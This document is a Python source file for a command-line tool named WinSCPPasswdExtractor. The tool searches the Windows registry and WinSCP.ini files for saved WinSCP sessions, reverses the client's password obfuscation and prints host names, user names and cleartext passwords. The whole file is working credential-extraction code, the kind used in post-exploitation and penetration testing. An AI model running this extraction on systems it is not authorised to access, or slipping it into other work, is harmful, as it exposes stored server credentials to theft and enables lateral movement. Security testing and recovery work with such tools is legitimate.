import configparser
import os
import sys
import importlib.metadata
import argparse
from argparse import RawTextHelpFormatter
from urllib.parse import unquote
try:
    import winreg
except ImportError:
    _winregAvailable = False

PW_MAGIC = 0xA3
PW_FLAG  = 0xFF


def getConfig(filePath=""):
    """
    Scans the system and the registry for WinSCP configurations and extracts credentials.
    By Default it will look for credentials in the registry and WinSCP.ini files in ~/Documents and ~/AppData/Roaming.

    Parameters
    ----------
    filePath : String
        Path to the WinSCP.ini file (default "")
    """
    if filePath:
        print("Looking for WinSCP creds in {f}...".format(f=filePath))
        if os.path.isfile(filePath):
            print("WinSCP.ini file found in {f}. Extracting Credentials...".format(f=filePath))
            decryptIni(filePath)
    else:
        print("No file path provided. Looking for WinSCP creds on the System...")
        if _winregAvailable:
            decryptRegistry()
        else:
            print("Unable to import winreg. Skipping registry extraction.")
        if os.path.isfile("C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini".format(u=os.getlogin())):
            filePath = "C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini".format(u=os.getlogin())
            print("WinSCP.ini file found in {f}. Extracting Credentials...".format(f=filePath))
            decryptIni(filePath)
        elif os.path.isfile("C:\\Users\\{u}\\Documents\\WinSCP.ini".format(u=os.getlogin())):
            filePath = "C:\\Users\\{u}\\Documents\\WinSCP.ini".format(u=os.getlogin())
            print("WinSCP.ini file found in {f}. Extracting Credentials...".format(f=filePath))
            decryptIni(filePath)
        else:
            print("No WinSCP.ini file found in default locations")


# ==================== Hanndle Configs ====================
def decryptRegistry():
    print("Looking for WinSCP creds in Registry...")
    sessions_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions')
    count = winreg.QueryInfoKey(sessions_key)[0]
    if count == 0:
        print("No entries found in Registry")
    else:
        # Check if master password is set
        session_key2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Martin Prikryl\\WinSCP 2\\Configuration\\Security')
        masterPassword = get_value(session_key2, 'UseMasterPassword')
        if masterPassword == 1:
            print("Master Password Set, unable to recover saved passwords!")
            return

        print("Found {c} entries in Registry. Extracting Credentials...".format(c=count-1))
        print("[=======REGISTRY=======]")
        for index in range(1, count):
            session = winreg.EnumKey(sessions_key, index)
            session_key = winreg.OpenKey(sessions_key, session)
            hostName = get_value(session_key, 'HostName')
            userName = get_value(session_key, 'UserName')
            password = get_value(session_key, 'Password')
            if password:
                decPassword = decryptPasswd(hostName, userName, password)
            else:
                decPassword = "NO_PASSWORD_FOUND"
            sectionName = unquote(session)
            hostNameEscaped = unquote(hostName)
            printCreds(sectionName, hostNameEscaped, userName, decPassword)


def decryptIni(filepath):
    config = configparser.ConfigParser(strict=False)
    config.read(filepath)

    # Stop extracting creds if Master Password is set
    if (int(config.get('Configuration\\Security', 'UseMasterPassword')) == 1):
        print("Master Password Set, unable to recover saved passwords!")
        return

    print("[=======WinSCP.ini=======]")
    for section in config.sections():
        if config.has_option(section, 'HostName'):
            hostName = config.get(section, 'HostName')
            userName = config.get(section, 'UserName')
            if config.has_option(section, 'Password'):
                encPassword = config.get(section, 'Password')
                decPassword = decryptPasswd(hostName, userName, encPassword)
            else:
                decPassword = "NO_PASSWORD_FOUND"
            sectionName = unquote(section)
            hostNameEscaped = unquote(hostName)
            printCreds(sectionName, hostNameEscaped, userName, decPassword)


def get_value(session_key, str) -> str:
    try:
        value = winreg.QueryValueEx(session_key, str)[0]
    except Exception as e:
        value = ''
    return value


def printCreds(sectionName, hostName, userName, decPassword):
    print("====={s}=====".format(s=sectionName))
    print("HostName: {s}".format(s=hostName))
    print("UserName: {s}".format(s=userName))
    print("Password: {s}\n".format(s=decPassword))


# ==================== Decrypt Password ====================
def decryptPasswd(host: str, username: str, password: str) -> str:
    key = username + host

    # transform password to bytes
    passBytes = []
    for i in range(len(password)):
        val = int(password[i], 16)
        passBytes.append(val)

    pwFlag, passBytes = dec_next_char(passBytes)
    pwLength = 0

    # extract password length and trim the passbytes
    if pwFlag == PW_FLAG:
        _, passBytes = dec_next_char(passBytes)
        pwLength, passBytes = dec_next_char(passBytes)
    else:
        pwLength = pwFlag
    to_be_deleted, passBytes = dec_next_char(passBytes)
    passBytes = passBytes[to_be_deleted * 2:]

    # decrypt the password
    clearpass = ""
    for i in range(pwLength):
        val, passBytes = dec_next_char(passBytes)
        clearpass += chr(val)
    if pwFlag == PW_FLAG:
        clearpass = clearpass[len(key):]
    return clearpass


def dec_next_char(passBytes) -> tuple[int, bytes]:
    """
    Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.

    Parameters
    ----------
    passBytes : bytes
        The password bytes
    """
    if not passBytes:
        return 0, passBytes
    a = passBytes[0]
    b = passBytes[1]
    passBytes = passBytes[2:]
    return ~(((a << 4) + b) ^ PW_MAGIC) & 0xff, passBytes


def printBanner():
    __version__ = importlib.metadata.version("WinSCPPasswdExtractor")
    print(f"""
 __          ___        _____  _____ _____  _____                          _ ______      _                  _             
 \ \        / (_)      / ____|/ ____|  __ \|  __ \                        | |  ____|    | |                | |            
  \ \  /\  / / _ _ __ | (___ | |    | |__) | |__) |_ _ ___ _____      ____| | |__  __  _| |_ _ __ __ _  ___| |_ ___  _ __ 
   \ \/  \/ / | | '_ \ \___ \| |    |  ___/|  ___/ _` / __/ __\ \ /\ / / _` |  __| \ \/ / __| '__/ _` |/ __| __/ _ \| '__|
    \  /\  /  | | | | |____) | |____| |    | |  | (_| \__ \__ \\ V  V / (_| | |____ >  <| |_| | | (_| | (__| || (_) | |   
     \/  \/   |_|_| |_|_____/ \_____|_|    |_|   \__,_|___/___/ \_/\_/ \__,_|______/_/\_\\__|_|  \__,_|\___|\__\___/|_|   
                                                                                                                                                                                                                                                                                           
                        Extract WinSCP Credentials from any Windows System or winscp config file
                                                    Made by NeffIsBack
                                                      Version: {__version__}
""")


def gen_cli_args():
    example_text = """Example Usage:
    WinSCPPasswdExtractor
    WinSCPPasswdExtractor WinSCP.ini
    """
    parser = argparse.ArgumentParser(prog='WinSCPPasswdExtractor', epilog=example_text, formatter_class=RawTextHelpFormatter)

    parser.add_argument('-v', '--version', action='version', version='Current Version: %(prog)s 2.0')
    parser.add_argument('--path', help="Specify a Path to the WinSCP config file to extract credentials directly. (Default: None)")

    return parser.parse_args()

def run():
    args = gen_cli_args()
    printBanner()

    getConfig(args.path)

if __name__ == '__main__':
    run()
